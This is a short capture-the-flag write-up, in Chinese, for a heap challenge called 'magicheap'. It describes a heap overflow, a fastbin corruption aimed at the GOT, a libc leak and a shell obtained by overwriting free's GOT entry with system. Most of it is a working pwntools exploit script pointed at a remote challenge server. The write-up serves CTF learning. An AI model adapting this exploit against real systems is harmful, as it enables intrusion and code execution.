## magicheap(250)
Credits to my teammates.

### solution
#### heap overflow
跟作業一樣，`edit()`會有任意大小overflow

#### fastbin corruption
把fastbin的下一個改成`.got.plt`的一個適合的位置，下次`malloc`時，會得到此位置，修改`free.got`

#### information leak
由於此題沒show，先將一個large chunk free掉，再`malloc()`它將其填入`8*'A'`，再將`free.got`改成`puts@plt`，就可以`puts`出main arena位置，進而算出libc

#### get shell
將`free.got`改成`system`即可get shell

### script
```pyhton
from pwn import *

#r = process("./magicheap",env={"LD_PRELOAD":"./ais3.so.6"})
r = remote('35.201.132.60',50216)

def cre(size,cont):
	r.sendlineafter('ice :','1')
	r.sendlineafter(': ',str(size))
	r.sendafter(':',cont)

def edit(idx,size,cont):
	r.sendlineafter('ice :','2')
	r.sendlineafter(':',str(idx))
	r.sendlineafter(': ',str(size))
	r.sendafter(': ',cont)

def free(idx):
	r.sendlineafter('ice :','3')
	r.sendlineafter(':',str(idx))

r.recvuntil(":")
r.send('a')

cre(0x1000,'a') #0
cre(0x100,'a')#1
free(0)
cre(0x1000,'a'*8)#0
tar = 0x601ffa
cre(0x50,'a')#2
puts_plt = 0x4006b0
free(2)
edit(1,0x200,'a'*0x100+p64(0)+p64(0x61)+p64(tar))
cre(0x50,'sh\x00')#2
cre(0x50,'aaaaaa'+'a'*8+p64(puts_plt))#3
free(0)
r.recvuntil('a'*8)
l = u64(r.recvuntil('\n')[:-1].ljust(8,'\x00'))
libc = l - 0x3c4b78
print hex(libc)
system = libc + 0x45390
edit(3,0x100,'a'*14+p64(system))
free(2)
r.interactive()
```
